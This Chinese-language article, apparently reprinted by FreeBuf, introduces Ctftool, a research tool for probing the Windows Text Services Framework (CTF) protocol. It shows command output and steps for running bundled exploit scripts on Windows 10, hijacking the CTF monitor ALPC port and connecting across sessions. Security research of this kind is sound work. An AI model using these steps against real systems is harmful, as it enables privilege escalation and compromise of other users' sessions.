![](https://image.3001.net/images/20200216/1581783150_5e48186e8fa49.jpg!small)

**Ctftool是一款交互式的命令行工具，可以帮助安全研究人员对CTF（Windows平台下用于实现文本服务的协议）进行安全测试。在Ctftool的帮助下，安全研究人员可以轻松对Windows内部运行和调试文本输入处理器的复杂问题进行分析，并检测目标Windows系统的安全性。**

除此之外，Ctftool还允许研究人员根据自己的需要来编写一些简单的脚本来实现与CTF客户端或服务器端的自动化交互，以及执行简单的模糊测试任务。

## 工具下载

广大研究人员可以使用下列命令将项目源码克隆至本地：

    
    
    git clone https://github.com/taviso/ctftool.git

## 项目构建

注意：如果你不想自己构建项目源码的话，你可以直接访问该项目的[
_Release页面_](https://github.com/taviso/ctftool/releases)来下载编译好的版本。

我们使用了[ _GNU make_](http://gnuwin32.sourceforge.net/packages/make.htm)和Visual
Studio 2019来开发Ctftool，目前该项目仅支持32位版本，但是该工具支持在Windows x86和x64平台上运行。

安装好所有的依赖组件之后，直接在开发者命令行终端中输入“make”命令即可完成项目构建。

这里，我使用的构建工具是一个变种版本的Visual Studio，构建时我只选择了MSVC、MSBuild、CMake和SDK。

这个项目使用了子模块来处理部分依赖，你可以使用下列命令来获取所需的依赖代码：

    
    
    git submodule update --init --recursive

## 工具使用

Ctftool目前已在Windows 7、Windows 8和Windows 10上进行了测试，并且支持32位和64位版本。

广大演技人员可以使用“help”命令来查看该工具支持的命令列表，或者输入“help <command>”来查看具体命令的使用方式：

    
    
    $ ./ctftool.exe
    An interactive ctf exploration tool by @taviso.
    Type "help" for available commands.
    Most commands require a connection, see "help connect".
    ctf> help
    Type `help <command>` for help with a specific command.
    Any line beginning with # is considered a comment.
    
    help            - List available commands.
    exit            - Exit the shell.
    connect         - Connect to CTF ALPC Port.
    info            - Query server informaiton.
    scan            - Enumerate connected clients.
    callstub        - Ask a client to invoke a function.
    createstub      - Ask a client to instantiate CLSID.
    hijack          - Attempt to hijack an ALPC server path.
    sendinput       - Send keystrokes to thread.
    setarg          - Marshal a parameter.
    getarg          - Unmarshal a parameter.
    wait            - Wait for a process and set it as the default thread.
    thread          - Set the default thread.
    sleep           - Sleep for specified milliseconds.
    forget          - Forget all known stubs.
    stack           - Print the last leaked stack ptr.
    marshal         - Send command with marshalled parameters.
    proxy           - Send command with proxy parameters.
    call            - Send command without appended data.
    window          - Create and register a message window.
    patch           - Patch a marshalled parameter.
    module          - Print the base address of a module.
    module64        - Print the base address of a 64bit module.
    editarg         - Change the type of a marshalled parameter.
    symbol          - Lookup a symbol offset from ImageBase.
    set             - Change or dump various ctftool parameters.
    show            - Show the value of special variables you can use.
    lock            - Lock the workstation, switch to Winlogon desktop.
    repeat          - Repeat a command multiple times.
    run             - Run a command.
    script          - Source a script file.
    print           - Print a string.
    consent         - Invoke the UAC consent dialog.
    reg             - Lookup a DWORD in the registry.
    gadget          - Find the offset of a pattern in a file.
    section         - Lookup property of PE section.
    Most commands require a connection, see "help connect".
    ctf>

拿到工具之后，我们首先要做的就是建立会话链接，并且查看已连接的客户端：

    
    
    ctf> connect
    The ctf server port is located at \BaseNamedObjects\msctf.serverDefault1
    NtAlpcConnectPort("\BaseNamedObjects\msctf.serverDefault1") => 0
    Connected to CTF server@\BaseNamedObjects\msctf.serverDefault1, Handle 00000264
    ctf> scan
    Client 0, Tid 3400 (Flags 0x08, Hwnd 00000D48, Pid 8696, explorer.exe)
    Client 1, Tid 7692 (Flags 0x08, Hwnd 00001E0C, Pid 8696, explorer.exe)
    Client 2, Tid 9424 (Flags 0x0c, Hwnd 000024D0, Pid 9344, SearchUI.exe)
    Client 3, Tid 12068 (Flags 0x08, Hwnd 00002F24, Pid 12156, PROCEXP64.exe)
    Client 4, Tid 9740 (Flags 0000, Hwnd 0000260C, Pid 3840, ctfmon.exe)

接下来，我们就可以通过向服务器端发送或接受命令，来对已连接的客户端进行测试。

## 漏洞利用

该工具可以用来扫描和发现CTF协议中许多严重的安全问题，如果你想在Windows 10 x64
1903上运行该工具并测试漏洞，可以直接双击运行ctftool.exe，并运行下列命令：

    
    
    An interactive ctf exploration tool by @taviso.
    Type "help" for available commands.
    Most commands require a connection, see "help connect".
    ctf> script .\scripts\ctf-consent-system.ctf

实际上，漏洞利用代码会分为两个阶段运行，因此我们也可以单独执行这两个阶段的代码。比如说，你可能想要入侵的进程属于不同会话上的同一个用户，此时可以使用connect命令的可选参数。

接下来，你可以建立一条会话链接，选择一个需要入侵的客户端，然后运行下列命令：

    
    
    ctf> script .\scripts\ctf-exploit-common-win10.ctf

## 监控劫持

由于CTF协议中的客户端跟服务器端之间不需要身份认证，那么如果攻击者有权限写入\BaseNamedObjects的话，他就可以创建CTF
ALPC端口，并伪装成监控器。

此时，攻击者将能够绕过监视器以及所有限制来执行任何操作。

使用“hijack”命令即可实现：

    
    
    An interactive ctf exploration tool by @taviso.
    Type "help" for available commands.
    ctf> hijack Default 1
    NtAlpcCreatePort("\BaseNamedObjects\msctf.serverDefault1") => 0 00000218
    NtAlpcSendWaitReceivePort("\BaseNamedObjects\msctf.serverDefault1") => 0 00000218
    000000: 18 00 30 00 0a 20 00 00 00 11 00 00 44 11 00 00  ..0.. ......D...
    000010: a4 86 00 00 b7 66 b8 00 00 11 00 00 44 11 00 00  .....f......D...
    000020: e7 12 01 00 0c 00 00 00 80 01 02 00 20 10 d6 05  ............ ...
    A a message received
            ProcessID: 4352, SearchUI.exe
            ThreadId: 4420
            WindowID: 00020180
    NtAlpcSendWaitReceivePort("\BaseNamedObjects\msctf.serverDefault1") => 0 00000218
    000000: 18 00 30 00 0a 20 00 00 ac 0f 00 00 0c 03 00 00  ..0.. ..........
    000010: ec 79 00 00 fa 66 b8 00 ac 0f 00 00 0c 03 00 00  .y...f..........
    000020: 12 04 01 00 08 00 00 00 10 01 01 00 00 00 00 00  ................
    A a message received
            ProcessID: 4012, explorer.exe
            ThreadId: 780
            WindowID: 00010110
    NtAlpcSendWaitReceivePort("\BaseNamedObjects\msctf.serverDefault1") => 0 00000218
    000000: 18 00 30 00 0a 20 00 00 ac 0f 00 00 0c 03 00 00  ..0.. ..........
    000010: fc 8a 00 00 2a 67 b8 00 ac 0f 00 00 0c 03 00 00  ....*g..........
    000020: 12 04 01 00 08 00 00 00 10 01 01 00 58 00 00 00  ............X...
    A a message received
            ProcessID: 4012, explorer.exe
            ThreadId: 780
    ...

## 跨会话攻击

在CTF协议中，不存在会话隔离，任何进程都可以跟任意CTF服务器进行连接。Ctftool工具中的“connect”命令支持连接至非默认会话：

    
    
    An interactive ctf exploration tool by @taviso.
    Type "help" for available commands.
    Most commands require a connection, see "help connect".
    ctf> help connect
    Connect to CTF ALPC Port.
    
    Usage: connect [DESKTOPNAME SESSIONID]
    Without any parameters, connect to the ctf monitor for the current
    desktop and session. All subsequent commands will use this connection
    for communicating with the ctf monitor.
    
    If a connection is already open, the existing connection is closed first.
    
    If DESKTOPNAME and SESSIONID are specified, a connection to ctf monitor
    for another desktop and session are opened, if it exists.
    If the specified port does not exist, wait until it does exist. This is
    so that you can wait for a session that hasn't started
    yet in a script.
    Examples
     Connect to the monitor for current desktop
      ctf> connect
     Connect to a specific desktop and session.
      ctf> connect Default 1
    Most commands require a connection, see "help connect".

## 项目地址

> Ctftool：【[ _GitHub传送门_](https://github.com/taviso/ctftool)】

## 参考资料

> 1、[ _https://googleprojectzero.blogspot.com/2019/08/down-rabbit-> hole.html_](https://googleprojectzero.blogspot.com/2019/08/down-rabbit-> hole.html)

 *** 参考来源：[
_taviso_](https://github.com/taviso/ctftool)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

